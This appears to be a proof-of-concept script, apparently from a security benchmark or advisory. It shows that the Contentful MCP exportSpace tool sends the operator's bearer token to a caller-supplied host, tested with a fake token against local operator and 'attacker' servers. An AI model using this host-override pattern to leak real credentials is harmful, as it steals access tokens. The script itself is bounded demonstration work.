import { readFile, mkdtemp, rm } from "node:fs/promises";
import { createServer } from "node:https";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { ContentfulMcpTools } from "@contentful/mcp-tools";

const certificatePath = process.env.CONTENTFUL_WITNESS_CERT;
const keyPath = process.env.CONTENTFUL_WITNESS_KEY;
if (!certificatePath || !keyPath) {
  throw new Error("CONTENTFUL_WITNESS_CERT and CONTENTFUL_WITNESS_KEY required");
}

const fakeToken = "FAKE_CONTENTFUL_RUNTIME_WITNESS_TOKEN";
const exportDirectory = await mkdtemp(
  join(tmpdir(), "contentful-mcp-runtime-witness-"),
);
const tls = {
  cert: await readFile(certificatePath),
  key: await readFile(keyPath),
};

async function endpoint() {
  const requests = [];
  const server = createServer(tls, (request, response) => {
    requests.push({
      authorization: request.headers.authorization ?? "",
      method: request.method ?? "",
      url: request.url ?? "",
    });
    response.writeHead(401, { "content-type": "application/json" });
    response.end(JSON.stringify({ message: "bounded witness rejection" }));
  });
  await new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, "127.0.0.1", resolve);
  });
  const address = server.address();
  if (typeof address === "string" || address === null) {
    throw new Error("loopback endpoint did not expose a TCP address");
  }
  return { requests, server, host: `127.0.0.1:${address.port}` };
}

const operator = await endpoint();
const attacker = await endpoint();
try {
  const jobs = new ContentfulMcpTools({
    accessToken: fakeToken,
    host: operator.host,
    mcpVersion: "benchmark",
  }).getJobTools();
  void jobs.exportSpace.tool(
    {
      contentFile: "witness.json",
      environmentId: "master",
      exportDir: exportDirectory,
      host: attacker.host,
      spaceId: "bounded-witness-space",
    },
    {},
  );
  await new Promise((resolve, reject) => {
    const deadline = Date.now() + 10_000;
    const timer = setInterval(() => {
      if (operator.requests.length > 0 || attacker.requests.length > 0) {
        clearInterval(timer);
        resolve();
      } else if (Date.now() >= deadline) {
        clearInterval(timer);
        reject(new Error("runtime witness timed out before the first request"));
      }
    }, 25);
  });
  process.stdout.write(
    `${JSON.stringify({
      operatorAuthorization:
        operator.requests[0]?.authorization === `Bearer ${fakeToken}`,
      operatorRequests: operator.requests.length,
      attackerAuthorization:
        attacker.requests[0]?.authorization === `Bearer ${fakeToken}`,
      attackerRequests: attacker.requests.length,
    })}\n`,
  );
} finally {
  await Promise.all([
    new Promise((resolve) => operator.server.close(resolve)),
    new Promise((resolve) => attacker.server.close(resolve)),
  ]);
  await rm(exportDirectory, { recursive: true, force: true });
}
process.exit(0);
